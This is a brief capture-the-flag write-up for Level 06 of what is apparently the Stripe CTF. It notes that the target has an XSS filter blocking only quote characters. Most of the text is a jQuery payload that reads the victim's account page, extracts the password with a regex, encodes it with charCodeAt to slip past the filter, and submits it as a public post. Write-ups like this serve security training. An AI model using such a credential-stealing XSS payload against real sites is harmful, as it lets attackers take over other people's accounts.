LEVEL 06
========

XSS vulnerability, only ' & " are not allowd, add <script>.

    $.get('https://level06-2.stripe-ctf.com/user-gdnipyajcv/user_info',
      function(data) {
        var password = /Password:<\/th>\s+<td>(.+)<\/td>/.exec(data)[1];
        var res = '';
        for (var i = 0; i < password.length; i++) {
          res += password.charCodeAt(i) + ", ";
        }
        console.log(res);
        $("#content").val(res);
        $("#new_post").submit();
      })

Escape with JavaScript String.charCodeAt()
[http://jdstiles.com/java/cct.html](http://jdstiles.com/java/cct.html)
